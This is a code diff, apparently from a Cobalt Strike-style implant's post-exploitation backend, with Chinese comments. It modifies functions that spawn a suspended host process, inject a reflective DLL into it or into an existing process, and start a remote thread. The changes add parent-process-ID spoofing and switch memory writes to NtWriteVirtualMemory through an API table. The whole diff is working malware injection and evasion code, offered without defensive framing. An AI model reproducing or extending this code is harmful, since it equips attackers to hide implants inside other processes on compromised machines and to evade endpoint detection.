@@ -1,5 +1,6 @@
 #include "beacon_postex_backend.h"
 #include "beacon_inject.h"
+#include "beacon_spawn.h"
 
 /* 读取远程 PostExConfig，判断远程模块是否已经完成或被取消。 */
 BOOL PostExRemoteCompleted(PostExJob* job)
@@ -141,7 +142,8 @@ static BOOL PostExValidateTargetMachine(HANDLE process,
 }
 
 /* 准备远程 reflective DLL 和 PostExConfig，返回远程入口与资源地址。 */
-BOOL PostExPrepareRemoteReflective(HANDLE process, const ByteBuf* dll,
+BOOL PostExPrepareRemoteReflective(const Win32Api* api,
+                                   HANDLE process, const ByteBuf* dll,
                                    const PostExConfig* config,
                                    PVOID* remote_image,
                                    SIZE_T* remote_image_size,
@@ -158,7 +160,7 @@ BOOL PostExPrepareRemoteReflective(HANDLE process, const ByteBuf* dll,
     if (remote_entry) *remote_entry = NULL;
     if (err && err_size) err[0] = '\0';
 
-    if (!process || !dll || !dll->data || dll->len < sizeof(IMAGE_DOS_HEADER) ||
+    if (!api || !process || !dll || !dll->data || dll->len < sizeof(IMAGE_DOS_HEADER) ||
         !config || !remote_image || !remote_config || !remote_entry) {
         if (err) strcpy_s(err, err_size, "invalid remote reflective request");
         return FALSE;
@@ -168,6 +170,7 @@ BOOL PostExPrepareRemoteReflective(HANDLE process, const ByteBuf* dll,
     InjectResultInit(&result);
     req.method = INJECT_METHOD_REFLECTIVE;
     req.process = process;
+    req.api = api;
     req.image = dll;
     req.parameter = config;
     req.parameter_size = sizeof(*config);
@@ -187,7 +190,8 @@ BOOL PostExPrepareRemoteReflective(HANDLE process, const ByteBuf* dll,
 }
 
 /* 启动 reflective DLL 入口线程，参数为远程 PostExConfig 地址。 */
-BOOL PostExCreateRemoteReflectiveThread(HANDLE process,
+BOOL PostExCreateRemoteReflectiveThread(const Win32Api* api,
+                                        HANDLE process,
                                         PVOID remote_entry,
                                         PVOID remote_config,
                                         HANDLE* remote_thread,
@@ -199,14 +203,15 @@ BOOL PostExCreateRemoteReflectiveThread(HANDLE process,
         if (err) strcpy_s(err, err_size, "invalid remote reflective entry");
         return FALSE;
     }
-    return InjectCreateRemoteThread(process, remote_entry, remote_config,
+    return InjectCreateRemoteThread(api, process, remote_entry, remote_config,
                                     5, 150,
                                     "invalid remote reflective entry",
                                     remote_thread, err, err_size);
 }
 
 /* 完成 reflective DLL 的准备与启动，并在启动失败时回滚远程内存。 */
-BOOL PostExStartRemoteReflective(HANDLE process, const ByteBuf* dll,
+BOOL PostExStartRemoteReflective(const Win32Api* api,
+                                 HANDLE process, const ByteBuf* dll,
                                  const PostExConfig* config,
                                  PVOID* remote_image,
                                  SIZE_T* remote_image_size,
@@ -216,14 +221,14 @@ BOOL PostExStartRemoteReflective(HANDLE process, const ByteBuf* dll,
 {
     PVOID remote_entry = NULL;
 
-    if (!PostExPrepareRemoteReflective(process, dll, config,
+    if (!PostExPrepareRemoteReflective(api, process, dll, config,
                                        remote_image, remote_image_size,
                                        remote_config, &remote_entry,
                                        err, err_size)) {
         return FALSE;
     }
 
-    if (!PostExCreateRemoteReflectiveThread(process, remote_entry, *remote_config,
+    if (!PostExCreateRemoteReflectiveThread(api, process, remote_entry, *remote_config,
                                             remote_thread, err, err_size)) {
         InjectResult cleanup_remote;
         InjectResultInit(&cleanup_remote);
@@ -295,19 +300,27 @@ BOOL PostExStartSpawnRemote(const PostExStartRequest* req,
     PostExFillConfig(&config, pipe_name_w, req->module_args);
     config.flags |= POSTEX_CONFIG_FLAG_REMOTE;
 
-    /* 先挂起宿主，完成远程 DLL/config 写入后再恢复主线程。 */
+    /* 先挂起宿主，完成远程 DLL/config 写入后再恢复主线程。
+     * PPID 欺骗策略：请求携带 ppid 则覆盖，否则用全局 spawn_ppid 配置。 */
     ZeroMemory(&si, sizeof(si));
     ZeroMemory(&pi, sizeof(pi));
     si.cb = sizeof(si);
-    if (!CreateProcessW(NULL, command_line_w, NULL, NULL, FALSE,
-                        CREATE_SUSPENDED | CREATE_NO_WINDOW,
-                        NULL, NULL, &si, &pi)) {
-        if (err) _snprintf_s(err, err_size, _TRUNCATE,
-                             "postex spawn CreateProcess failed: %lu",
-                             (ULONG)GetLastError());
-        HeapFree(GetProcessHeap(), 0, command_line_w);
-        HeapFree(GetProcessHeap(), 0, pipe_name_w);
-        return FALSE;
+    {
+        SpawnOptions spawn_opt;
+
+        ZeroMemory(&spawn_opt, sizeof(spawn_opt));
+        spawn_opt.ppid = req->ppid ? req->ppid : SpawnGetPpid();
+        spawn_opt.fallback_plain = TRUE;
+
+        if (!SpawnCreateProcess(req->api, &spawn_opt,
+                                NULL, command_line_w, NULL, NULL, FALSE,
+                                CREATE_SUSPENDED | CREATE_NO_WINDOW,
+                                NULL, NULL, &si, &pi,
+                                err, err_size)) {
+            HeapFree(GetProcessHeap(), 0, command_line_w);
+            HeapFree(GetProcessHeap(), 0, pipe_name_w);
+            return FALSE;
+        }
     }
     if (!PostExValidateTargetMachine(pi.hProcess, dll_machine, err, err_size)) {
         TerminateProcess(pi.hProcess, 1);
@@ -318,7 +331,7 @@ BOOL PostExStartSpawnRemote(const PostExStartRequest* req,
         return FALSE;
     }
 
-    if (!PostExPrepareRemoteReflective(pi.hProcess, &req->dll, &config,
+    if (!PostExPrepareRemoteReflective(req->api, pi.hProcess, &req->dll, &config,
                                        remote_image, &remote_image_size,
                                        remote_config, &remote_entry,
                                        err, err_size)) {
@@ -336,8 +349,9 @@ BOOL PostExStartSpawnRemote(const PostExStartRequest* req,
     CloseHandle(pi.hThread);
     pi.hThread = NULL;
 
-    if (!PostExCreateRemoteReflectiveThread(pi.hProcess, remote_entry, *remote_config,
-                                            remote_thread, err, err_size)) {
+    if (!PostExCreateRemoteReflectiveThread(req->api, pi.hProcess, remote_entry,
+                                            *remote_config, remote_thread,
+                                            err, err_size)) {
         InjectResult cleanup_remote;
         InjectResultInit(&cleanup_remote);
         cleanup_remote.remote_image = *remote_image;
@@ -418,7 +432,7 @@ BOOL PostExStartInjectRemote(const PostExStartRequest* req,
         return FALSE;
     }
 
-    if (!PostExStartRemoteReflective(*process, &req->dll, &config,
+    if (!PostExStartRemoteReflective(req->api, *process, &req->dll, &config,
                                      remote_image, &remote_image_size,
                                      remote_config, remote_thread,
                                      err, err_size)) {
@@ -509,7 +523,7 @@ static BOOL PostExRemoteThreadCancelJob(PostExJob* job, UINT32 reason)
     SIZE_T done = 0;
     PBYTE base;
 
-    if (!job || !job->process || !job->remote_config) {
+    if (!job || !job->api || !job->process || !job->remote_config) {
         return FALSE;
     }
 
@@ -522,17 +536,19 @@ static BOOL PostExRemoteThreadCancelJob(PostExJob* job, UINT32 reason)
     flags |= POSTEX_CONFIG_CONTROL_CANCEL;
 
     done = 0;
-    if (!WriteProcessMemory(job->process,
-                            base + FIELD_OFFSET(PostExConfig, cancel_reason),
-                            &cancel_reason, sizeof(cancel_reason), &done) ||
+    if (!NT_SUCCESS(job->api->pfnNtWriteVirtualMemory(
+            job->process,
+            base + FIELD_OFFSET(PostExConfig, cancel_reason),
+            &cancel_reason, sizeof(cancel_reason), &done)) ||
         done != sizeof(cancel_reason)) {
         return FALSE;
     }
 
     done = 0;
-    if (!WriteProcessMemory(job->process,
-                            base + FIELD_OFFSET(PostExConfig, control_flags),
-                            &flags, sizeof(flags), &done) ||
+    if (!NT_SUCCESS(job->api->pfnNtWriteVirtualMemory(
+            job->process,
+            base + FIELD_OFFSET(PostExConfig, control_flags),
+            &flags, sizeof(flags), &done)) ||
         done != sizeof(flags)) {
         return FALSE;
     }
